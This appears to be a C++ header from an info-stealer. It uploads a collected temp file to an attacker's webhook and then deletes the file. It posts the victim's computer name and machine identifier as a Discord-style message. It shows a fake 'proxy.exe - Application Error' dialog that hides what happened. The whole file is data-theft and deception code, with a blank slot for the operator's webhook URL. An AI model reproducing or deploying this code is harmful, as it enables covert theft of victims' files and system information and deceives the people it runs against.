#pragma once
#include "file.h"

const char* webhook_url = ""; // your webhook url

size_t WriteCall(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}

void send_dat() {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if (curl) {

        struct curl_httppost* formpost = nullptr;
        struct curl_httppost* lastptr = nullptr;
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file", CURLFORM_FILE, temp_path, CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCall);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "send data failed: " << curl_easy_strerror(res) << std::endl;

        }
        curl_easy_cleanup(curl);


        curl_formfree(formpost);
    }
    curl_global_cleanup();
    std::remove(temp_path);
}

void send_message() {

    std::string message = " > [" + getCOMP() + " with " + getMC() + "]";
    std::string msg = std::string("{\"content\": \"") + message + "\"}";
    curl_global_init(CURL_GLOBAL_DEFAULT);
    if (auto* const curl = curl_easy_init())
    {
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, msg.c_str());
        const CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "send message failed: %s\n", curl_easy_strerror(res));

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

void send_error() {
    std::string msbg = "The application was unable to start correctly(0xc000007b).Click OK to close the application", mstt = "proxy.exe - Application Error";
    LPWSTR ws = new wchar_t[msbg.size() + 1], wss = new wchar_t[mstt.size() + 1];
    copy(msbg.begin(), msbg.end(), ws), copy(mstt.begin(), mstt.end(), wss);
    ws[msbg.size()] = 0, wss[mstt.size()] = 0;
    MessageBox(NULL, ws, wss, MB_ICONERROR);
}